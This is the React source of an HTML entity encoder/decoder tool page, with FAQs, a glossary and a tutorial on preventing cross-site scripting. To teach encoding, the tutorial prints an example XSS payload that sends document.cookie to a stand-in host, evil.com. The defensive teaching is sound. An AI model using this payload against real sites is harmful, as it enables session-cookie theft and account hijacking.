
import { PageHeader } from '@/components/page-header';
import { HtmlEntityEncoderDecoder } from './html-entity-encoder-decoder';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import { StructuredData } from '@/components/structured-data';
import { Lightbulb, AlertTriangle, BookOpen, ChevronRight, Wand, ArrowRightLeft, Copy } from 'lucide-react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import Link from 'next/link';

export const metadata = {
    title: 'HTML Entity Encoder / Decoder | ICT Toolbench',
    description: 'Instantly convert special HTML characters to their entity names or numbers (e.g., < to &lt;) and back. A crucial tool for safely displaying code and text in HTML.',
    openGraph: {
        title: 'HTML Entity Encoder / Decoder | ICT Toolbench',
        description: 'Encode and decode HTML entities to prevent rendering issues and cross-site scripting (XSS) vulnerabilities.',
        url: '/tools/html-entity-encoder-decoder',
    }
};

const faqData = [
    { question: "What are HTML entities?", answer: "HTML entities are pieces of text ('strings') that begin with an ampersand (`&`) and end with a semicolon (`;`). They are used to display reserved characters that have special meaning in HTML (like `<` which defines a tag), or characters that are not on a standard keyboard." },
    { question: "Why do I need to encode HTML entities?", answer: "Encoding is necessary to display literal special characters as text. If you want to show the code `<p>Hello</p>` on your webpage, you must encode the `<` and `>` characters as `&lt;` and `&gt;`. If you don't, the browser will interpret `<p>Hello</p>` as an actual HTML tag and render it, instead of displaying the code itself." },
    { question: "Is this a security tool?", answer: "Yes, in a way. Properly encoding user-generated content before displaying it on a page is a critical defense against Cross-Site Scripting (XSS) attacks. If a user enters `<script>alert('hacked')</script>` and you render it directly into your HTML, the script will execute. By encoding it to `&lt;script&gt;alert('hacked')&lt;/script&gt;`, you ensure it is displayed as harmless text." },
    { question: "What is the difference between a named entity and a numbered entity?", answer: "A named entity is a memorable name (e.g., `&copy;` for the copyright symbol). A numbered entity uses the character's Unicode code point in either decimal (`&#169;`) or hexadecimal (`&#x00A9;`). All modern browsers support both, but named entities are more readable in code." },
    { question: "Is it safe to use this tool with sensitive data?", answer: "Yes. All encoding and decoding operations happen entirely within your web browser using JavaScript. Your data is never sent to our servers, ensuring it remains private." },
    { question: "Does this tool encode all possible entities?", answer: "This tool focuses on the five most critical characters for preventing HTML rendering issues and XSS: `&`, `<`, `>`, `\"`, and `'`." },
    { question: "How does this relate to URL encoding?", answer: "They solve similar problems but for different contexts. HTML entity encoding makes text safe to display inside an HTML document. URL encoding makes text safe to include in a URL's address bar. They use different escape characters (`&` vs `%`) and encode different sets of characters. Use our <a href='/tools/url-encoder-decoder' class='text-primary hover:underline'>URL Encoder/Decoder</a> for that purpose." },
    { question: "What is the `<code>` tag in HTML?", answer: "The `<code>` tag is used to display a fragment of computer code. While it often renders the text in a monospace font, it does *not* automatically escape the HTML within it. You must still encode special characters inside a `<code>` tag if you want to display them literally." }
];

const howToSchema = {
    '@context': 'https://schema.org',
    '@type': 'HowTo',
    name: 'How to Use the HTML Entity Encoder/Decoder',
    description: 'A guide to encoding and decoding HTML special characters.',
    step: [
        { '@type': 'HowToStep', name: 'Enter Text', text: 'To encode, type or paste your plain text (containing characters like <, >, &) into the top "Decoded" box. To decode, paste your entity-encoded text (containing &lt;, &gt;, &amp;) into the bottom "Encoded" box.' },
        { '@type': 'HowToStep', name: 'View Instant Results', text: 'The tool works in real-time. As you type in one box, the correctly converted text will instantly appear in the other.' },
        { '@type': 'HowToStep', name: 'Copy or Swap', text: 'Use the copy button to grab the output, or the swap button to switch the contents of the two text boxes.' },
    ],
    totalTime: 'PT1M'
};

const keyTerminologies = [
    { term: 'HTML Entity', definition: 'A string of text that begins with an ampersand (`&`) and ends with a semicolon (`;`), used to represent special or reserved characters.' },
    { term: 'Character Encoding', definition: 'The process of converting characters into a format that can be safely rendered or transmitted.' },
    { term: 'Reserved Characters', definition: 'Characters that have a special meaning in HTML syntax, such as `<` (starts a tag) and `>` (ends a tag).' },
    { term: 'XSS (Cross-Site Scripting)', definition: 'A web security vulnerability that allows an attacker to inject malicious scripts into content that is then delivered to other users\' browsers.' },
    { term: 'Monospace Font', definition: 'A font where every character occupies the same amount of horizontal space, commonly used for displaying code.' },
];


export default function HtmlEntityEncoderDecoderPage() {
    const faqSchema = {
        '@context': 'https://schema.org',
        '@type': 'FAQPage',
        mainEntity: faqData.map(item => ({
            '@type': 'Question',
            name: item.question,
            acceptedAnswer: {
                '@type': 'Answer',
                text: item.answer.replace(/<[^>]*>?/gm, ''),
            },
        })),
      };
    
      const softwareAppSchema = {
        "@context": "https://schema.org",
        "@type": "SoftwareApplication",
        "name": "HTML Entity Encoder / Decoder",
        "operatingSystem": "All",
        "applicationCategory": "DeveloperApplication",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        },
        "description": "A free, client-side tool to encode and decode special HTML characters to and from their entity representations, useful for displaying code and preventing XSS.",
        "url": "https://www.icttoolbench.com/tools/html-entity-encoder-decoder"
      };

      return (
        <>
          <StructuredData data={faqSchema} />
          <StructuredData data={howToSchema} />
          <StructuredData data={softwareAppSchema} />
          <div className="max-w-4xl mx-auto space-y-12">
              <PageHeader
                  title="HTML Entity Encoder / Decoder"
                  description="Safely display code and special characters in your HTML. This tool converts reserved characters to their corresponding HTML entities and back again, helping you prevent display issues and Cross-Site Scripting (XSS) vulnerabilities."
              />
              <HtmlEntityEncoderDecoder />

              <section>
              <h2 className="text-2xl font-bold mb-4">How to Use This Tool</h2>
              <Card className="prose prose-sm max-w-none text-foreground p-6">
                  <p>This tool provides real-time, two-way conversion for HTML entities. It helps you safely display text that contains characters with special meaning in HTML.</p>
                  <ol>
                      <li><strong>Live Conversion:</strong> The tool works instantly. Start typing in either the "Decoded" or "Encoded" box. The other box will automatically update with the converted content.</li>
                      <li><strong>To Encode:</strong> Type plain text containing special characters (like `&lt;div class="container"&gt;`) into the top "Decoded" box. The safe, encoded version will appear in the bottom "Encoded" box.</li>
                      <li><strong>To Decode:</strong> Paste text containing HTML entities (like `&amp;lt;p&amp;gt;Hello&amp;lt;/p&amp;gt;`) into the bottom "Encoded" box. The original plain text will appear in the top "Decoded" box.</li>
                      <li><strong>Swap & Copy:</strong> Use the `Swap` button (<ArrowRightLeft className="inline h-4 w-4" />) to instantly switch the contents of the two boxes. Use the `Copy` icon (<Copy className="inline h-4 w-4" />) to copy the contents of either box to your clipboard.</li>
                  </ol>
              </Card>
              </section>
              
              <section>
              <h2 className="text-2xl font-bold mb-4">Key Terminologies</h2>
              <Card>
                  <CardContent className="p-6">
                      <dl className="space-y-4">
                          {keyTerminologies.map((item) => (
                              <div key={item.term}>
                                  <dt className="font-semibold">{item.term}</dt>
                                  <dd className="text-muted-foreground text-sm">{item.definition}</dd>
                              </div>
                          ))}
                      </dl>
                  </CardContent>
              </Card>
              </section>

              <Card className='bg-secondary/30 border-primary/20'>
                  <CardHeader>
                      <div className='flex items-center gap-2 text-primary'>
                          <BookOpen className="h-6 w-6" aria-hidden="true" />
                          <CardTitle className="text-primary">Educational Deep Dive: Displaying Code Safely</CardTitle>
                      </div>
                      <CardDescription>From showing code examples to preventing XSS, understand why HTML entity encoding is a fundamental web development practice.</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-6 prose prose-lg max-w-none text-foreground">
                      <section>
                          <h3>The Problem: Code is Text, But So Is HTML</h3>
                          <p>
                              The HyperText Markup Language (HTML) uses specific characters to define its structure. The less-than (`<`) and greater-than (`>`) signs are the most important, as they are used to open and close tags. This creates a problem: what if you want to actually *display* the character `<` or a snippet of HTML code on your webpage?
                          </p>
                          <p>If you write `<p>This is a paragraph.</p>` in your HTML source, the browser will render it as a paragraph. But if you want to *show* that code as text, you can't just write it as-is, because the browser will interpret it as an instruction. This is where HTML entities come in.</p>
                      </section>
                      <section>
                          <h3>The Solution: HTML Entities</h3>
                          <p>
                              An HTML entity is a special code that the browser renders as a specific character. It allows you to display reserved characters literally, without them being interpreted as HTML code. For example, to display `<p>`, you would write `&lt;p&gt;`. The browser sees `&lt;` and knows to render it as a literal `<` character.
                          </p>
                      </section>
                      <section>
                          <h3>A Critical Security Practice: Preventing XSS</h3>
                          <p>
                              HTML entity encoding is not just for displaying code; it's a critical security measure against <strong>Cross-Site Scripting (XSS)</strong> attacks. If your website has a comments section and you display user comments directly, an attacker could submit a comment like:
                          </p>
                           <div className="bg-muted p-4 rounded-md font-code text-sm">
                              <pre>
      {`<script>document.location='http://evil.com/steal-cookie?c=' + document.cookie;</script>`}
                              </pre>
                          </div>
                          <p>
                              If you render this directly, the malicious script will run in the browser of every other user who views the page, potentially stealing their session cookies and hijacking their accounts. By encoding the user's input before displaying it, the malicious comment is transformed into harmless text that the browser will simply display, not execute:
                          </p>
                           <div className="bg-muted p-4 rounded-md font-code text-sm">
                              <pre>
      {`&lt;script&gt;document.location='http://evil.com/steal-cookie?c=' + document.cookie;&lt;/script&gt;`}
                              </pre>
                          </div>
                           <p>
                              **Always encode any user-generated content before rendering it in your HTML.**
                          </p>
                      </section>
                  </CardContent>
              </Card>

              <div className="grid md:grid-cols-2 gap-8">
                  <Card>
                      <CardHeader>
                          <div className='flex items-center gap-2'><Wand className="h-6 w-6 text-accent" /> <CardTitle>Pro Tips</CardTitle></div>
                      </CardHeader>
                      <CardContent>
                          <ul className="list-disc pl-5 space-y-3 text-sm text-muted-foreground">
                              <li><strong>Use in `<pre>` and `<code>` Tags:</strong> When displaying blocks of code, wrap the encoded text in `<pre>` and `<code>` tags. This preserves whitespace and signals to the browser (and other developers) that the content is code.</li>
                              <li><strong>Server-Side Encoding is Best:</strong> While this tool is great for manual conversion, in a real application, you should always perform entity encoding on the server-side before sending the HTML to the browser. Every modern web framework has a built-in function for this.</li>
                              <li><strong>Named vs. Numbered Entities:</strong> For common characters, named entities (`&copy;`, `&euro;`) are more readable in your source code than numbered ones (`&#169;`, `&#8364;`).</li>
                          </ul>
                      </CardContent>
                  </Card>
                  <Card>
                      <CardHeader>
                           <div className='flex items-center gap-2'><AlertTriangle className="h-6 w-6 text-destructive" /> <CardTitle>Common Mistakes to Avoid</CardTitle></div>
                      </CardHeader>
                      <CardContent>
                           <ul className="list-disc pl-5 space-y-3 text-sm text-muted-foreground">
                              <li><strong>Forgetting to Encode:</strong> The most dangerous mistake is to forget to encode user-supplied content, opening a major XSS vulnerability.</li>
                              <li><strong>Double Encoding:</strong> Encoding text that has already been encoded. This will result in the browser displaying the entity code itself (e.g., you'll see `&amp;lt;` on the page instead of `<`).</li>
                              <li><strong>Confusing with URL Encoding:</strong> Using HTML entity encoding on a URL parameter, or vice-versa. They are for different purposes and use different syntax.</li>
                          </ul>
                      </CardContent>
                  </Card>
              </div>
              
              <section>
                  <h2 className="text-2xl font-bold mb-4">Frequently Asked Questions</h2>
                  <Card>
                      <CardContent className="p-6">
                          <Accordion type="single" collapsible className="w-full">
                              {faqData.map((item, index) => (
                                  <AccordionItem value={`item-${index}`} key={index}>
                                      <AccordionTrigger>{item.question}</AccordionTrigger>
                                      <AccordionContent>
                                          <div dangerouslySetInnerHTML={{ __html: item.answer }} />
                                      </AccordionContent>
                                  </AccordionItem>
                              ))}
                          </Accordion>
                      </CardContent>
                  </Card>
              </section>
          </div>
        </>
    );
}
